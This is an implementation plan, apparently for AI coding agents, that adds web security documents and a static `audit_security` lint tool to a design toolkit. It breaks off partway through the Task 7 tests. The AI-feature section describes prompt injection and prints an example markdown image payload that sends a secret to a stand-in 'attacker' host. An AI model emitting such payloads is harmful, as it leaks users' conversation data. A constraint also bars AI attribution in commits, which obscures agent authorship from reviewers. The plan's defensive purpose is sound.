# Web Security Layer Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Give SaglitzDesign a web security axis — five sourced knowledge documents under a new `security` category, and an `audit_security` tool that finds real defects in source and deployment configuration without making a network call.

**Architecture:** The knowledge documents follow the existing frontmatter contract and load through the existing `loadKnowledge` walker with no new loader. The tool is a new `src/security.ts` that reuses `LintFinding` and `lint.ts`'s tag scanner for markup rules, adds a configuration-file reader for header rules, and reports through the same shape as `design_lint`. Header state is *inferred from local files* — nothing is fetched.

**Tech Stack:** TypeScript (ESM, `node16` resolution), Zod for tool schemas, `@modelcontextprotocol/sdk` 1.29, Vitest. Tests import from `dist/`, so `npm test` builds first.

## Global Constraints

- **Node ≥ 20** (`engines`); code must parse on Node 18 without new syntax beyond what the codebase already uses.
- **No new runtime dependencies.** The package ships `@modelcontextprotocol/sdk` and `zod` only. No sanitiser library, no CSP parser, no YAML/TOML parser — configuration files are read as text.
- **No network calls, ever.** Not in the tool, not in tests.
- **Configuration files are never evaluated.** Read as text only, matching the rule `import_design_tokens` set for `tailwind.config.js`.
- **No heuristic rules.** A rule ships only if it can be stated as a fact about the source. False positives in security output teach the reader to distrust all of it.
- **Every rule sets `doc`** to a knowledge document id that exists.
- **Permitted source domains** for every `sources:` entry in the new documents:
  `w3.org`, `www.w3.org`, `w3c.github.io`, `whatwg.org`, `html.spec.whatwg.org`, `datatracker.ietf.org`, `rfc-editor.org`, `developer.mozilla.org`, `web.dev`, `developer.chrome.com`, `developers.google.com`, `webkit.org`, `hacks.mozilla.org`, `owasp.org`, `cheatsheetseries.owasp.org`, `genai.owasp.org`, `fidoalliance.org`, `passkeys.dev`, `nextjs.org`, `docs.astro.build`, `svelte.dev`, `vite.dev`, `edpb.europa.eu`, `ico.org.uk`, `kvkk.gov.tr`, `eur-lex.europa.eu`, `caniuse.com`.
  Nothing else. No Medium, no dev.to, no listicles, no scanner vendors.
- **`updated:`** is the date the claims were verified against the source, not the date the file was created. Use `2026-08-12` unless verification happens later.
- **British/US spelling:** match surrounding files — the codebase uses British spelling in comments (`normalise`, `behaviour`) and US in user-facing docs. Follow the file you are in.
- **Commit messages:** no AI/assistant attribution of any kind. Author is the repo's own git identity.

---

## File Structure

| File | Responsibility |
|---|---|
| `knowledge/security/web-security-headers.md` | CSP, Trusted Types, HSTS, COOP/COEP/CORP, Permissions-Policy, SRI |
| `knowledge/security/auth-and-session-ux.md` | Passkeys, cookies, sessions, CSRF, account-takeover flows |
| `knowledge/security/frontend-attack-surface.md` | XSS by context, dangerous sinks, third-party scripts, bundle secrets |
| `knowledge/security/privacy-consent-and-tracking.md` | GDPR/KVKK/ePrivacy, consent UI, script gating, deletion flows |
| `knowledge/security/ai-feature-security.md` | Model output as untrusted input, injection, tool-call confirmation |
| `src/security.ts` | All security rules, header extraction, report assembly |
| `src/lint.ts` | *Modified* — export `scanTags` and `Tag` |
| `src/project.ts` | *Modified* — `scanProject` matches exact filenames as well as extensions |
| `src/catalog.ts` | *Modified* — `security` category, focus filter, staleness threshold, review map |
| `src/knowledge.ts` | *Modified* — `security` in `KNOWN_CATEGORIES` |
| `src/index.ts` | *Modified* — `audit_security` registration |
| `tests/security.test.ts` | Rule behaviour, both directions (fires / does not fire) |
| `tests/integrity.test.ts` | *Modified* — tool name, doc count, source allowlist |

---

### Task 1: The `security` category and the first document

**Files:**
- Create: `knowledge/security/web-security-headers.md`
- Modify: `src/knowledge.ts:101-103`, `src/catalog.ts:9`, `src/catalog.ts:71-80` (`FOCUS_MAP`), `src/catalog.ts:176-179` (`STALE_DAYS`)
- Test: `tests/integrity.test.ts`

**Interfaces:**
- Consumes: nothing.
- Produces: the `"security"` category string, accepted by `CATEGORIES`, `KNOWN_CATEGORIES`, `FOCUS_MAP.security` and `STALE_DAYS.security`. The doc id `web-security-headers`, which every later task's rules cite via `doc`.

- [ ] **Step 1: Write the failing tests**

Add to `tests/integrity.test.ts`, inside the existing `describe("knowledge base metadata")`:

```ts
  it("declares a security category with documents in it", () => {
    expect(CATEGORIES).toContain("security");
    const sec = docs.filter((d) => d.category === "security");
    expect(sec.length).toBeGreaterThan(0);
  });

  it("gives every category a staleness threshold", () => {
    const missing = [...CATEGORIES].filter((c) => STALE_DAYS[c] === undefined);
    expect(missing).toEqual([]);
  });
```

Then add a new top-level `describe` at the end of the file:

```ts
const PERMITTED_SOURCE_HOSTS = new Set([
  "w3.org", "www.w3.org", "w3c.github.io", "whatwg.org", "html.spec.whatwg.org",
  "datatracker.ietf.org", "rfc-editor.org", "developer.mozilla.org",
  "web.dev", "developer.chrome.com", "developers.google.com", "webkit.org",
  "hacks.mozilla.org", "owasp.org", "cheatsheetseries.owasp.org", "genai.owasp.org",
  "fidoalliance.org", "passkeys.dev", "nextjs.org", "docs.astro.build",
  "svelte.dev", "vite.dev", "edpb.europa.eu", "ico.org.uk", "kvkk.gov.tr",
  "eur-lex.europa.eu", "caniuse.com",
]);

describe("security documents cite permitted sources only", () => {
  it("uses no blog-tier source", () => {
    const offenders: string[] = [];
    for (const d of docs.filter((x) => x.category === "security")) {
      for (const url of d.sources ?? []) {
        let host: string;
        try {
          host = new URL(url).hostname.replace(/^www\./, "");
        } catch {
          offenders.push(`${d.id}: unparseable source ${url}`);
          continue;
        }
        if (!PERMITTED_SOURCE_HOSTS.has(host) && !PERMITTED_SOURCE_HOSTS.has(`www.${host}`)) {
          offenders.push(`${d.id}: ${host}`);
        }
      }
    }
    expect(offenders).toEqual([]);
  });

  it("cites at least three sources per document", () => {
    const thin = docs
      .filter((d) => d.category === "security")
      .filter((d) => (d.sources ?? []).length < 3)
      .map((d) => d.id);
    expect(thin).toEqual([]);
  });
});
```

`KnowledgeDoc` already carries `sources: string[]` (`src/knowledge.ts:10`), so no loader change is needed.

- [ ] **Step 2: Run the tests to verify they fail**

```bash
npm run build && npx vitest run tests/integrity.test.ts
```

Expected: FAIL — `CATEGORIES` does not contain `"security"`.

- [ ] **Step 3: Register the category**

`src/knowledge.ts`, the `KNOWN_CATEGORIES` set:

```ts
const KNOWN_CATEGORIES = new Set([
  "design-language", "component", "ux", "seo", "geo", "pattern", "craft", "book", "process", "marketing", "security",
]);
```

`src/catalog.ts` line 9:

```ts
export const CATEGORIES = ["design-language", "component", "ux", "seo", "geo", "pattern", "craft", "book", "process", "marketing", "security"] as const;
```

`src/catalog.ts`, `FOCUS_MAP` — add after the `geo` entry:

```ts
  security: (d) => d.category === "security",
```

`src/catalog.ts`, `STALE_DAYS` — security guidance moves faster than design guidance and rots more dangerously, so it gets the tightest threshold in the table:

```ts
export const STALE_DAYS: Record<string, number> = {
  security: 90,
  seo: 120, geo: 120, "design-language": 240, pattern: 300,
  component: 365, ux: 365, craft: 365, book: 730, process: 365, marketing: 240,
};
```

- [ ] **Step 4: Write `knowledge/security/web-security-headers.md`**

Frontmatter, verbatim:

```markdown
---
id: web-security-headers
title: "Web Security Headers & Content Security Policy"
category: security
platform: web
tags: [security, csp, headers, trusted-types, hsts, sri, clickjacking, cors]
sources: ["https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP", "https://web.dev/articles/strict-csp", "https://w3c.github.io/webappsec-csp/", "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html", "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security", "https://web.dev/articles/coop-coep", "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Permissions-Policy", "https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity", "https://web.dev/articles/trusted-types", "https://nextjs.org/docs/app/guides/content-security-policy"]
updated: 2026-08-12
---
```

Required sections and the claims each must carry. Verify every number against the sources above before writing it — do not carry a number over from memory:

1. **`## The one policy that matters`** — a strict, nonce-based starter policy, given as a real header line. Must include `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'`, and `strict-dynamic`.
2. **`## Why host allowlists fail`** — an allowlist is bypassable through JSONP endpoints and open redirects on allowlisted hosts; this is why `strict-dynamic` with nonces/hashes is the recommended shape rather than a domain list.
3. **`## Nonce vs hash vs strict-dynamic`** — a nonce must be unpredictable and regenerated per response; a nonce on a statically cached page is worthless. Say that plainly, because it is the most common way a CSP is deployed broken.
4. **`## Rolling out without breaking the site`** — `Content-Security-Policy-Report-Only` with `report-to` first, read reports, then enforce. State what a strict policy typically breaks: inline `style=` attributes, analytics snippets, embedded video, injected third-party widgets.
5. **`## Trusted Types`** — `require-trusted-types-for 'script'` eliminates DOM XSS as a class rather than case by case. State current browser support honestly (Chromium yes, check Firefox/Safari status at write time against caniuse.com) and say it is additive, not a CSP replacement.
6. **`## HSTS`** — `max-age`, `includeSubDomains`, `preload`. Must state that preload list removal is slow and effectively one-way, and that `includeSubDomains` breaks any plain-HTTP subdomain.
7. **`## Cross-origin isolation`** — COOP/COEP/CORP, and that you need them only for `SharedArrayBuffer` and high-resolution timers. Do not present them as universally required; that is a common overreach.
8. **`## The cheap ones`** — `X-Content-Type-Options: nosniff`, `Referrer-Policy` (recommend `strict-origin-when-cross-origin`), `Permissions-Policy` denying camera/microphone/geolocation by default.
9. **`## Subresource Integrity`** — required on every cross-origin script; needs `crossorigin="anonymous"`; note that SRI plus a CDN that mutates its bundle equals a broken page, which is why self-hosting is often the better answer.
10. **`## Superseded — do not recommend`** — `X-Frame-Options` (use `frame-ancestors`), `X-XSS-Protection` (removed; auditors still ask for it), Expect-CT (obsolete), `document.domain` (being removed). Readers arrive carrying these; omitting them does not correct them.
11. **`## Per-stack starter`** — Next.js middleware with a generated nonce, a static/CDN `_headers` file, and Astro. Real, pasteable.

Write in the codebase's prescriptive register: rules an agent applies verbatim, numbers, do/don't. Match the density of `knowledge/seo/technical-seo.md`.

- [ ] **Step 5: Run tests to verify they pass**

```bash
npm test
```

Expected: PASS, including the source-allowlist test.

- [ ] **Step 6: Commit**

```bash
git add knowledge/security/web-security-headers.md src/knowledge.ts src/catalog.ts tests/integrity.test.ts
git commit -m "feat: add a security category and the web security headers document

The knowledge base had 88 documents and did not contain the string
Content-Security-Policy. This adds the category, the tightest staleness
threshold in the table (90 days, because security guidance rots
dangerously rather than merely going out of style), and the first
document. An integrity test asserts every source is on the permitted
allowlist so the sourcing standard survives later edits."
```

---

### Task 2: `auth-and-session-ux`

**Files:**
- Create: `knowledge/security/auth-and-session-ux.md`
- Test: `tests/integrity.test.ts` (existing assertions cover it — no new test code)

**Interfaces:**
- Consumes: the `security` category from Task 1.
- Produces: doc id `auth-and-session-ux`, cited by the `token-in-localstorage` and `password-autocomplete` rules in Task 7.

- [ ] **Step 1: Write the document**

Frontmatter, verbatim:

```markdown
---
id: auth-and-session-ux
title: "Authentication & Session Security as UX"
category: security
platform: web
tags: [security, auth, passkeys, webauthn, cookies, session, csrf, 2fa]
sources: ["https://web.dev/articles/passkey-form-autofill", "https://passkeys.dev/docs/use-cases/bootstrapping/", "https://fidoalliance.org/passkeys/", "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html", "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html", "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html", "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies", "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie", "https://web.dev/articles/samesite-cookies-explained", "https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API"]
updated: 2026-08-12
---
```

Required sections and claims:

1. **`## Passkeys are the default now`** — WebAuthn/passkeys as the primary factor; conditional UI (`autocomplete="username webauthn"`) so the passkey appears in the autofill sheet rather than behind a separate button. The fallback ladder for users without one, and why "passkey only, no fallback" locks people out.
2. **`## Cookies`** — a table of `HttpOnly`, `Secure`, `SameSite` (`Lax` / `Strict` / `None`), `__Host-` prefix, `Path`, `Max-Age`. State what each one actually prevents. `__Host-` is the strongest available binding and is nearly free.
3. **`## Never store a token in localStorage`** — any XSS becomes full, persistent account takeover, because `localStorage` is readable by any script on the origin and survives tab close. This is the single highest-value rule in the document; state the alternative (`HttpOnly` cookie, or in-memory + silent refresh) concretely.
4. **`## Session lifetime`** — idle timeout vs absolute timeout; rotate the session identifier on privilege change and on login (session fixation); invalidate server-side on logout, because clearing a cookie client-side does not.
5. **`## Step-up authentication`** — re-authenticate before password change, email change, 2FA removal, payout details. Name these four explicitly; they are the account-takeover chain.
6. **`## CSRF`** — `SameSite=Lax` is a strong default but not sufficient alone: it does not protect top-level `GET`-triggered state change, and it gives nothing to cross-site `POST` from a subdomain you do not control. Pair with a synchroniser token or double-submit for state-changing requests.
7. **`## Enumeration and rate limits`** — identical response and identical timing for "account exists" and "does not exist"; the copy pattern is "if an account exists for that address, we've sent a link". Rate limit per account *and* per IP; lockout that a stranger can trigger is a denial-of-service on the real user.
8. **`## The flows that get breached`** — password reset (single-use, short-lived, invalidates sessions), email change (confirm at both addresses), 2FA enrolment and recovery codes.
9. **`## Copy that does not leak`** — cross-link to `ux-writing`. Error text must not distinguish wrong-password from no-such-user.

Every claim verified against the OWASP cheat sheets and MDN listed above.

- [ ] **Step 2: Wire it in — the suite fails otherwise**

`tests/integrity.test.ts:131` asserts no document is orphaned from every checklist and roadmap (only `seo`, `geo` and design-language docs are exempt). A new security document that is not referenced fails the suite, so wiring is part of this task, not Task 10.

In `src/catalog.ts`, add `"auth-and-session-ux"` to `REVIEW_MAP.dashboard` and to a phase of `ROADMAPS["saas-web-app"]`. Not `website` or `landing-page`: a marketing site rarely has sessions, and a checklist padded with documents that do not apply stops being read.

- [ ] **Step 3: Run tests**

```bash
npm test
```

Expected: PASS — source allowlist and the ≥3-sources assertion both hold.

- [ ] **Step 4: Commit**

```bash
git add knowledge/security/auth-and-session-ux.md
git commit -m "feat: add the authentication and session security document

Covers the part of security that is genuinely a design problem: passkey
conditional UI, cookie flags, why a token in localStorage turns any XSS
into permanent account takeover, step-up re-auth before the four flows
that carry account takeover, and error copy that does not let an
attacker enumerate accounts."
```

---

### Task 3: `frontend-attack-surface`

**Files:**
- Create: `knowledge/security/frontend-attack-surface.md`

**Interfaces:**
- Consumes: the `security` category from Task 1.
- Produces: doc id `frontend-attack-surface`, cited by most Task 7 source rules.

- [ ] **Step 1: Write the document**

Frontmatter, verbatim:

```markdown
---
id: frontend-attack-surface
title: "Frontend Attack Surface"
category: security
platform: web
tags: [security, xss, sanitization, clickjacking, supply-chain, secrets, postmessage]
sources: ["https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html", "https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html", "https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API", "https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage", "https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe", "https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/rel", "https://owasp.org/www-community/attacks/Clickjacking", "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html", "https://nextjs.org/docs/app/guides/environment-variables"]
updated: 2026-08-12
---
```

Required sections and claims:

1. **`## XSS is contextual`** — the same string is safe in an HTML body and dangerous in an attribute, a URL, inside `<script>`, or in CSS. Escaping is per-context; a single `escapeHtml()` applied everywhere is the most common wrong mental model. Give the five contexts with the rule for each.
2. **`## The dangerous sinks`** — `dangerouslySetInnerHTML`, `v-html`, `{@html}`, `innerHTML`, `outerHTML`, `document.write`, `eval`, `new Function`, `setTimeout` with a string. When rendering untrusted HTML is unavoidable, sanitise — note the built-in Sanitizer API's status at write time and DOMPurify as the established option.
3. **`## Links and redirects`** — `target="_blank"` without `rel="noopener"` gives the opened page `window.opener` (reverse tabnabbing); modern browsers imply `noopener` for `target="_blank"` but the attribute is still required because the behaviour is not universal across embedded and older engines. Never build an `href` from user input without scheme-allowlisting — `javascript:` and `data:` both execute. Open redirects turn your domain into a phishing launchpad.
4. **`## Framing`** — clickjacking, and `frame-ancestors` as the mechanism (`X-Frame-Options` is the superseded one). `sandbox` every third-party iframe; state what `allow-scripts allow-same-origin` together gives away.
5. **`## postMessage`** — always check `event.origin` against an allowlist, and pass an explicit target origin instead of `"*"`. Both directions matter.
6. **`## Third-party scripts`** — every analytics, chat, A/B or tag-manager snippet is arbitrary script execution on your origin with your users' session. SRI, self-hosting, a subresource budget, and gating on consent. Tag managers specifically let a non-engineer ship script to production.
7. **`## Secrets in the bundle`** — `NEXT_PUBLIC_*` and `VITE_*` are inlined into client JavaScript at build time and are public forever once shipped; rotate anything that has been. Source maps in production expose original sources. `.env` committed to git stays in history after deletion.

- [ ] **Step 2: Wire it in — the suite fails otherwise**

`tests/integrity.test.ts:131` asserts no document is orphaned from every checklist and roadmap (only `seo`, `geo` and design-language docs are exempt). A new security document that is not referenced fails the suite, so wiring is part of this task, not Task 10.

In `src/catalog.ts`, add `"frontend-attack-surface"` to `REVIEW_MAP.website` and `REVIEW_MAP.dashboard`, and to the build/hardening phase of `ROADMAPS["website"]` and `ROADMAPS["saas-web-app"]`.

- [ ] **Step 3: Run tests**

```bash
npm test
```

Expected: PASS.

- [ ] **Step 4: Commit**

```bash
git add knowledge/security/frontend-attack-surface.md
git commit -m "feat: add the frontend attack surface document

The defects a designer or frontend developer actually ships: escaping
treated as context-free, the dangerous sinks by framework, reverse
tabnabbing, unvalidated redirects, unsandboxed third-party frames,
postMessage without an origin check, and build-time env vars that are
public the moment they ship."
```

---

### Task 4: `privacy-consent-and-tracking`

**Files:**
- Create: `knowledge/security/privacy-consent-and-tracking.md`

**Interfaces:**
- Consumes: the `security` category from Task 1.
- Produces: doc id `privacy-consent-and-tracking`.

- [ ] **Step 1: Write the document**

Frontmatter, verbatim:

```markdown
---
id: privacy-consent-and-tracking
title: "Privacy, Consent & Tracking"
category: security
platform: web
tags: [security, privacy, gdpr, kvkk, consent, cookies, analytics, dark-patterns]
sources: ["https://edpb.europa.eu/our-work-tools/general-guidance/guidelines-recommendations-best-practices_en", "https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/cookies-and-similar-technologies/", "https://eur-lex.europa.eu/eli/reg/2016/679/oj", "https://www.kvkk.gov.tr/", "https://developer.mozilla.org/en-US/docs/Web/Privacy", "https://web.dev/articles/privacy-sandbox-overview"]
updated: 2026-08-12
---
```

Required sections and claims:

1. **`## What actually requires consent`** — storing or reading anything on the device that is not strictly necessary for a service the user asked for. Strictly-necessary cookies do not need consent; analytics does. Get this distinction right, because most banners ask for consent they do not need and skip the consent they do.
2. **`## Consent UI that is not a dark pattern`** — reject must be as easy as accept, same visual weight, same number of clicks, on the first layer. No pre-ticked boxes. No cookie wall as the only option. No "legitimate interest" toggles buried a layer down and defaulted on. Cross-link `ethical-design`.
3. **`## Script gating`** — no tracking script fires before consent; this is a build-and-load-order problem, not a banner problem. A banner that appears while the tracker has already loaded is non-compliance with extra steps.
4. **`## Data minimisation and retention`** — collect the field only if a named use exists; set a retention period per data class; free-text fields are where regulated data arrives unplanned.
5. **`## The rights, as interfaces`** — access, export, correction, deletion. These are screens someone has to design; a deletion request handled by email is a design failure and a compliance risk.
6. **`## Privacy-preserving analytics`** — cookieless/aggregate options, and that server-side tagging does not by itself remove the consent requirement.
7. **`## KVKK notes`** — the Turkish regime's differences from GDPR that matter in practice (explicit consent, registry obligations, cross-border transfer rules), sourced to kvkk.gov.tr.

The document opens with a one-line notice: this is engineering and design guidance, not legal advice.

- [ ] **Step 2: Wire it in — the suite fails otherwise**

`tests/integrity.test.ts:131` asserts no document is orphaned from every checklist and roadmap (only `seo`, `geo` and design-language docs are exempt). A new security document that is not referenced fails the suite, so wiring is part of this task, not Task 10.

In `src/catalog.ts`, add `"privacy-consent-and-tracking"` to `REVIEW_MAP.website` and `REVIEW_MAP["landing-page"]` — both already carry `ethical-design`, which is the document it sits beside — and to a phase of `ROADMAPS["website"]`.

- [ ] **Step 3: Run tests**

```bash
npm test
```

Expected: PASS.

- [ ] **Step 4: Commit**

```bash
git add knowledge/security/privacy-consent-and-tracking.md
git commit -m "feat: add the privacy, consent and tracking document

Consent as an interface problem rather than a legal one: what genuinely
requires consent (most banners ask for the wrong thing), a banner that
is not a dark pattern, script gating as a load-order problem, and the
data-subject rights as screens someone has to design."
```

---

### Task 5: `ai-feature-security`

**Files:**
- Create: `knowledge/security/ai-feature-security.md`

**Interfaces:**
- Consumes: the `security` category from Task 1.
- Produces: doc id `ai-feature-security`.

- [ ] **Step 1: Write the document**

Frontmatter, verbatim:

```markdown
---
id: ai-feature-security
title: "Security for AI Features in the UI"
category: security
platform: web
tags: [security, ai, prompt-injection, llm, streaming, tool-calling]
sources: ["https://owasp.org/www-project-top-10-for-large-language-model-applications/", "https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html", "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html", "https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API", "https://web.dev/articles/strict-csp"]
updated: 2026-08-12
---
```

Required sections and claims:

1. **`## Model output is untrusted input`** — the governing rule. It is assembled from documents, web pages and user messages an attacker may control, so it gets the same treatment as a form field.
2. **`## Rendering the output`** — markdown-to-HTML is an XSS sink; sanitise after rendering, allowlist the tags, and strip raw HTML unless there is a reason not to. Never `dangerouslySetInnerHTML` a model response.
3. **`## Exfiltration through image and link URLs`** — a model persuaded to emit `![](https://attacker/?d=<secret>)` leaks conversation content on render, silently, with no click. CSP `img-src` and `connect-src` are the control. This is the least-known item in the document and deserves the most space.
4. **`## Streaming`** — partial markup during a stream can produce a different parse than the completed message; sanitise the accumulated buffer, not each chunk.
5. **`## Tool calls and confirmation`** — anything destructive, outbound or paid needs an explicit confirmation that states what will happen, in a UI the model does not author. A confirmation whose text comes from the model is not a control.
6. **`## Injection via retrieved content`** — RAG sources, uploaded files and fetched pages are attacker-reachable surfaces; show provenance in the UI so a user can tell where an instruction came from.

Cross-link `ai-product-ux` for the non-security side of these interfaces.

- [ ] **Step 2: Wire it in — the suite fails otherwise**

`tests/integrity.test.ts:131` asserts no document is orphaned from every checklist and roadmap (only `seo`, `geo` and design-language docs are exempt). A new security document that is not referenced fails the suite, so wiring is part of this task, not Task 10.

In `src/catalog.ts`, add `"ai-feature-security"` to `REVIEW_MAP.dashboard` and `REVIEW_MAP["mobile-app"]` — both already list `ai-product-ux`, which is the document it pairs with — and to a phase of `ROADMAPS["saas-web-app"]`.

- [ ] **Step 3: Run tests**

```bash
npm test
```

Expected: PASS.

- [ ] **Step 4: Commit**

```bash
git add knowledge/security/ai-feature-security.md
git commit -m "feat: add the AI feature security document

Model output is untrusted input, and the UI is where that bites:
markdown rendering as an XSS sink, image-URL exfiltration that leaks a
conversation on render with no click, sanitising the accumulated stream
buffer rather than each chunk, and confirmation UI the model does not
author."
```

---

### Task 6: Shared scanning primitives

**Files:**
- Modify: `src/lint.ts:36-58` (export `Tag` and `scanTags`), `src/project.ts:57` (`scanProject` signature)
- Test: `tests/project.test.ts`

**Interfaces:**
- Consumes: nothing.
- Produces:
  - `export interface Tag { name: string; attrs: string; index: number; end: number; selfClosing: boolean }`
  - `export function scanTags(src: string): Tag[]`
  - `export function scanProject(root: string, extensions?: string[], filenames?: string[]): ScanResult` — `filenames` matches a file's exact basename (case-sensitive), unioned with the extension match. Existing two-argument calls are unaffected.

- [ ] **Step 1: Write the failing test**

Add to `tests/project.test.ts`:

```ts
import { mkdtempSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";

it("scans files matched by exact name even without an extension", () => {
  const dir = mkdtempSync(join(tmpdir(), "sd-scan-"));
  writeFileSync(join(dir, "_headers"), "/*\n  X-Frame-Options: DENY\n");
  writeFileSync(join(dir, "app.css"), "a { color: red }");

  const withNames = scanProject(dir, [".css"], ["_headers"]);
  expect(withNames.files.map((f) => f.path).sort()).toEqual(["_headers", "app.css"]);

  const withoutNames = scanProject(dir, [".css"]);
  expect(withoutNames.files.map((f) => f.path)).toEqual(["app.css"]);
});
```

- [ ] **Step 2: Run it to verify it fails**

```bash
npm run build && npx vitest run tests/project.test.ts
```

Expected: FAIL — `scanProject` takes two arguments; `_headers` is not returned.

- [ ] **Step 3: Implement**

In `src/lint.ts`, change the two declarations to be exported. Nothing else moves:

```ts
export interface Tag {
```

```ts
export function scanTags(src: string): Tag[] {
```

In `src/project.ts`, widen `scanProject`:

```ts
export function scanProject(
  root: string,
  extensions: string[] = UI_EXTENSIONS,
  filenames: string[] = [],
): ScanResult {
  const wanted = new Set(extensions.map((e) => e.toLowerCase()));
  const wantedNames = new Set(filenames);
```

and at the point where the walker currently tests the extension, accept either match. The existing test reads roughly `if (!wanted.has(extname(entry.name).toLowerCase())) continue;` — replace with:

```ts
      const matchesExt = wanted.has(extname(entry.name).toLowerCase());
      const matchesName = wantedNames.has(entry.name);
      if (!matchesExt && !matchesName) continue;
```

Read the surrounding lines before editing; keep the caps (`MAX_FILES`, `MAX_TOTAL_BYTES`, `MAX_FILE_BYTES`) and the skip-directory logic exactly as they are.

- [ ] **Step 4: Run tests to verify they pass**

```bash
npm test
```

Expected: PASS, including every pre-existing `project.test.ts` case — the change must be additive.

- [ ] **Step 5: Commit**

```bash
git add src/lint.ts src/project.ts tests/project.test.ts
git commit -m "refactor: share the tag scanner and let scanProject match exact filenames

The security rules need the same markup scanner design_lint uses; a
second, subtly different regex would drift from it. scanProject matched
on extension only, and the files that carry header configuration —
_headers, .env — have no extension. Both changes are additive:
UI_EXTENSIONS is untouched and existing calls keep their behaviour."
```

---

### Task 7: Source rules

**Files:**
- Create: `src/security.ts`
- Test: `tests/security.test.ts`

**Interfaces:**
- Consumes: `LintFinding` and `scanTags` from `src/lint.js`.
- Produces:
  - `export function securitySourceRules(code: string, filename?: string): LintFinding[]`
  - Rule ids: `blank-without-noopener` (info), `window-open-without-noopener`, `external-script-no-sri`, `http-subresource`, `token-in-localstorage`, `public-env-secret`, `hardcoded-secret`, `dangerous-html`, `iframe-no-sandbox`, `postmessage-wildcard-origin`, `inline-event-handler`, `inline-script-no-nonce`, `password-autocomplete`. Thirteen rules, not twelve.

- [ ] **Step 1: Write the failing tests**

Create `tests/security.test.ts`:

```ts
import { describe, it, expect } from "vitest";
import { securitySourceRules } from "../dist/security.js";

const ids = (code: string, filename?: string) =>
  securitySourceRules(code, filename).map((f) => f.rule).sort();

describe("source rules — fire when they should", () => {
  it("flags target=_blank without rel=noopener, at info severity", () => {
    const findings = securitySourceRules(`<a href="https://x.com" target="_blank">go</a>`);
    const f = findings.find((x) => x.rule === "blank-without-noopener");
    expect(f).toBeDefined();
    // Browsers imply noopener on anchors at 95.58% (caniuse). Erroring here
    // would fire on correct modern markup; the live risk is window.open().
    expect(f!.severity).toBe("info");
  });

  it("flags window.open without noopener, more severely than the anchor case", () => {
    const findings = securitySourceRules(`const w = window.open(url, "_blank")`);
    const f = findings.find((x) => x.rule === "window-open-without-noopener");
    expect(f).toBeDefined();
    expect(f!.severity).toBe("warning");
  });

  it("accepts window.open with noopener in the features string", () => {
    expect(ids(`window.open(url, "_blank", "noopener,noreferrer")`)).not.toContain("window-open-without-noopener");
  });

  it("still flags it when a formatter split the tag over lines", () => {
    const code = `<a\n  href="https://x.com"\n  target="_blank"\n>go</a>`;
    expect(ids(code)).toContain("blank-without-noopener");
  });

  it("flags a cross-origin script without integrity", () => {
    expect(ids(`<script src="https://cdn.example.com/a.js"></script>`)).toContain("external-script-no-sri");
  });

  it("flags an http subresource", () => {
    expect(ids(`<img src="http://example.com/a.png">`)).toContain("http-subresource");
  });

  it("flags a token in localStorage", () => {
    expect(ids(`localStorage.setItem("authToken", jwt)`)).toContain("token-in-localstorage");
  });

  it("flags a secret-named public env var", () => {
    expect(ids(`const k = process.env.NEXT_PUBLIC_STRIPE_SECRET_KEY`)).toContain("public-env-secret");
  });

  it("flags dangerouslySetInnerHTML with no sanitiser in the file", () => {
    expect(ids(`<div dangerouslySetInnerHTML={{ __html: body }} />`)).toContain("dangerous-html");
  });

  it("flags a cross-origin iframe without sandbox", () => {
    expect(ids(`<iframe src="https://other.example/embed"></iframe>`)).toContain("iframe-no-sandbox");
  });

  it("flags postMessage to a wildcard origin", () => {
    expect(ids(`win.postMessage(payload, "*")`)).toContain("postmessage-wildcard-origin");
  });

  it("flags an inline event handler in HTML", () => {
    expect(ids(`<button onclick="go()">go</button>`, "page.html")).toContain("inline-event-handler");
  });

  it("flags a password field with autocomplete off", () => {
    expect(ids(`<input type="password" autocomplete="off">`)).toContain("password-autocomplete");
  });
});

describe("source rules — stay quiet when they should", () => {
  it("accepts target=_blank with rel=noopener noreferrer", () => {
    expect(ids(`<a href="https://x.com" target="_blank" rel="noopener noreferrer">go</a>`)).not.toContain("blank-without-noopener");
  });

  it("accepts a same-origin script without integrity", () => {
    expect(ids(`<script src="/app.js"></script>`)).not.toContain("external-script-no-sri");
  });

  it("accepts a cross-origin script with integrity", () => {
    const code = `<script src="https://cdn.example.com/a.js" integrity="sha384-abc" crossorigin="anonymous"></script>`;
    expect(ids(code)).not.toContain("external-script-no-sri");
  });

  it("accepts dangerouslySetInnerHTML when DOMPurify is imported in the file", () => {
    const code = `import DOMPurify from "dompurify";\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(body) }} />`;
    expect(ids(code)).not.toContain("dangerous-html");
  });

